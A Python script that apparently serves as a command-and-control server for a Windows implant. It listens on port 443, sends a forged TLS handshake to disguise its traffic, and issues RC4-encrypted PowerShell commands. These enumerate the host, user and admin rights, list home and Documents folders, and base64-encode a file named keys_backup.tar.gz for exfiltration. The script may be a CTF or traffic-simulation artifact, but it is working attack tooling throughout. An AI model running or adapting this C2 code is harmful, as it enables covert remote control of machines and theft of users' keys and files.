import socket
import struct
import time
import random

from Crypto.Cipher import ARC4

SECRET = b"\xf1n\xcd\xc6yLf\xd1\x02\xf83\xc4\x86\xe7\xa45\x8di\xbd\xd2\x1dP\xf5\xfb\xdf\xec\xaf\x0b\x9eS\xa4\xd3"

cmds = [
    "$env:COMPUTERNAME",
    "$env:USERNAME",
    "[System.Net.Dns]::GetHostByName($env:COMPUTERNAME)",
    "(Get-CimInstance Win32_OperatingSystem).Caption",
    "whoami /priv",
    "net session 2>&1 | Out-Null; if ($LASTEXITCODE -eq 0) {\"Admin\"} else {\"Standard User\"}",
    "ls $HOME",
    "ls $HOME\\Documents",
    "[Convert]::ToBase64String([System.IO.File]::ReadAllBytes(\"C:\\Users\\jdoe\\Documents\\keys_backup.tar.gz\"))",
    "exit"
]

def generate_data(s):
    rc4 = ARC4.new(SECRET, drop=-15)
    payload = rc4.encrypt(s.encode())
    return b"\x17\x03\x03" + struct.pack(">h", len(payload)) + payload

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind(("0.0.0.0", 443))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print(f"[+] Connected to {addr}")
        data = conn.recv(16384)
        conn.sendall(b"\x16\x03\x03\x00\x7a\x02\x00\x00\x76\x03\x03\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x20\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\x13\x02\x00\x00\x2e\x00\x2b\x00\x02\x03\x04\x00\x33\x00\x24\x00\x1d\x00\x20\x9f\xd7\xad\x6d\xcf\xf4\x29\x8d\xd3\xf9\x6d\x5b\x1b\x2a\xf9\x10\xa0\x53\x5b\x14\x88\xd7\xf8\xfa\xbb\x34\x9a\x98\x28\x80\xb6\x15\x14\x03\x03\x00\x01\x01")
        for cmd in cmds:
            print(f"> {cmd}")
            rc4 = ARC4.new(SECRET)
            payload = generate_data(cmd)
            conn.sendall(payload)
            if cmd == "exit":
                break
            data = b""
            while True:
                chunk = conn.recv(16384)
                data += chunk
                if chunk[-4:] == b"\x02\x04\x06\x08":
                    break
            decrypted = rc4.decrypt(data[5:-4])
            print(decrypted.decode())
            time.sleep(random.randint(1,5))
